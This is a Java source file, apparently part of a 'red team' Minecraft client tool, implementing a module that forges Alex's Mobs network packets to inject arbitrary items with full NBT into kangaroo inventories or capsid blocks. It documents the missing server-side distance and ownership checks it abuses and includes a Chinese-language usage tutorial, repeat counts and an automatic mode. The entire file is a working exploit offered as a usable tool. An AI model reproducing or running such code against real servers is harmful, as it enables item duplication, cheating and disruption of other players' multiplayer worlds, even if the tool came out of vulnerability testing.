package com.redblue.red.modules.alexsmobs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.level.block.entity.BlockEntity;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AM-01 + AM-02: Arbitrary item injection via Kangaroo inventory sync and Capsid block entity.
 *
 * AM-01 (index 6): MessageKangarooInventorySync
 *   Wire: writeInt(kangarooId) + writeInt(slotId) + writeItemStack(stack)
 *   No distance check, no ownership check, only slotId >= 0.
 *
 * AM-02 (index 8): MessageUpdateCapsid
 *   Wire: writeLong(blockPos.asLong()) + writeItemStack(stack)  [Citadel wrapper = vanilla writeItemStack]
 *   No distance check, no GUI-open check.
 */
public class AM01_ItemInjection implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("alexsmobs", "main_channel");
    private static final int IDX_KANGAROO_SYNC = 6;
    private static final int IDX_UPDATE_CAPSID = 8;

    /** 缓存从手持物品捕获的完整 ItemStack（含NBT），null 表示未捕获 */
    private volatile ItemStack capturedStack = null;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("target_type", "目标类型", "KANGAROO", "KANGAROO", "CAPSID"),
        ConfigParam.ofEntity("entity_id", "袋鼠实体")
                .visibleWhen("target_type", "KANGAROO"),
        ConfigParam.ofInt("slot_id", "袋鼠槽位", 0, 0, 8)
                .visibleWhen("target_type", "KANGAROO"),
        ConfigParam.ofAction("fill_block_pos", "填充当前坐标", () -> {
            Minecraft mc = Minecraft.getInstance();
            if (mc.player != null) {
                BlockPos pos = mc.player.blockPosition();
                String coord = pos.getX() + "," + pos.getY() + "," + pos.getZ();
                getParam("block_pos").ifPresent(p -> p.set(coord));
            }
        }).visibleWhen("target_type", "CAPSID"),
        ConfigParam.ofString("block_pos", "胶囊方块坐标(x,y,z)", "0,64,0")
                .visibleWhen("target_type", "CAPSID"),
        ConfigParam.ofItem("item", "注入物品", "minecraft:netherite_block"),
        ConfigParam.ofAction("pick_hand", "选择手持物品(含NBT)", () -> {
            Minecraft mc = Minecraft.getInstance();
            if (mc.player != null) {
                ItemStack hand = mc.player.getMainHandItem();
                if (!hand.isEmpty()) {
                    capturedStack = hand.copy(); // 完整复制，保留所有NBT
                    ResourceLocation rl = net.minecraftforge.registries.ForgeRegistries.ITEMS.getKey(hand.getItem());
                    getParam("item").ifPresent(p -> p.set(rl != null ? rl.toString() : "minecraft:air"));
                    getParam("count").ifPresent(p -> p.set(hand.getCount()));
                    CompoundTag tag = hand.getTag();
                    String nbtInfo = tag != null ? " §aNBT: " + tag.getAllKeys().size() + "个标签" : " §7无NBT";
                    chat("§e[AM01] 已捕获: " + hand.getHoverName().getString()
                            + " x" + hand.getCount() + nbtInfo);
                } else {
                    chat("§c[AM01] 主手为空");
                }
            }
        }),
        ConfigParam.ofInt("count", "堆叠数量", 64, 1, 64),
        ConfigParam.ofInt("repeat_count", "重复次数", 1, 1, 100),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "am01_item_injection"; }
    @Override public String name() { return "物品注入"; }
    @Override public String description() { return "向袋鼠背包或胶囊方块注入任意物品"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 启用模块\n"
            + "2. 选择目标类型：KANGAROO(袋鼠背包) 或 CAPSID(胶囊方块)\n"
            + "3. 袋鼠模式：用准星选取按钮对准袋鼠实体\n"
            + "4. 胶囊模式：点击「填充当前坐标」或手动填写坐标\n"
            + "5. 选择物品：点击「选择物品」从列表选择，或手持物品后点击「选择手持物品」\n"
            + "6. 设置数量，点击执行\n\n"
            + "[参数说明]\n"
            + "目标类型 — KANGAROO(袋鼠背包) / CAPSID(胶囊方块)\n"
            + "袋鼠实体 — 准星选取或手动输入实体ID\n"
            + "袋鼠槽位 — 注入到袋鼠背包的第几个槽位(0-8)\n"
            + "胶囊方块坐标 — 胶囊模式下目标方块的坐标\n"
            + "注入物品 — 点击「选择物品」从列表中选择\n"
            + "选择手持物品 — 自动读取主手物品的注册名和数量填入\n"
            + "堆叠数量 — 每次注入的物品数量(1-64)\n"
            + "重复次数 — 单次执行时重复注入的次数\n"
            + "自动间隔 — 自动模式下每次执行的间隔(tick)";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("alexsmobs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int repeat = getParam("repeat_count").map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < repeat; i++) {
            doInject(mc);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doInject(mc);
    }

    private void doInject(Minecraft mc) {
        String targetType = getParam("target_type").map(ConfigParam::getString).orElse("KANGAROO");
        ItemStack stack = buildItemStack();

        if ("KANGAROO".equals(targetType)) {
            injectKangaroo(mc, stack);
        } else {
            injectCapsid(mc, stack);
        }
    }

    private void injectKangaroo(Minecraft mc, ItemStack stack) {
        int entityId = getParam("entity_id").map(ConfigParam::getInt).orElse(0);
        if (entityId == 0) return;
        int slotId = getParam("slot_id").map(ConfigParam::getInt).orElse(0);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_KANGAROO_SYNC);
            buf.writeInt(entityId);
            buf.writeInt(slotId);
            buf.writeItemStack(stack, false);
        });
    }

    private void injectCapsid(Minecraft mc, ItemStack stack) {
        String posStr = getParam("block_pos").map(ConfigParam::getString).orElse("0,64,0");
        long blockPosLong = parseBlockPos(posStr);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_UPDATE_CAPSID);
            buf.writeLong(blockPosLong);
            buf.writeItemStack(stack, false);
        });
    }

    private ItemStack buildItemStack() {
        int count = getParam("count").map(ConfigParam::getInt).orElse(64);

        // 优先使用捕获的完整 ItemStack（含NBT）
        if (capturedStack != null && !capturedStack.isEmpty()) {
            ItemStack stack = capturedStack.copy();
            stack.setCount(count);
            return stack;
        }

        // 回退：从 ofItem 选择器的 registry name 创建（无NBT）
        String regName = getParam("item").map(ConfigParam::getString)
                .orElse("minecraft:netherite_block");
        ResourceLocation rl = new ResourceLocation(regName);
        Item item = net.minecraftforge.registries.ForgeRegistries.ITEMS.getValue(rl);
        if (item == null) item = Items.NETHERITE_BLOCK;
        return new ItemStack(item, count);
    }

    private long parseBlockPos(String posStr) {
        try {
            String[] parts = posStr.split(",");
            int x = Integer.parseInt(parts[0].trim());
            int y = Integer.parseInt(parts[1].trim());
            int z = Integer.parseInt(parts[2].trim());
            return BlockPos.asLong(x, y, z);
        } catch (Exception e) {
            return BlockPos.asLong(0, 64, 0);
        }
    }

    private static void chat(String msg) {
        Minecraft mc = Minecraft.getInstance();
        if (mc.player != null) {
            mc.player.displayClientMessage(
                    net.minecraft.network.chat.Component.literal(msg), false);
        }
    }
}
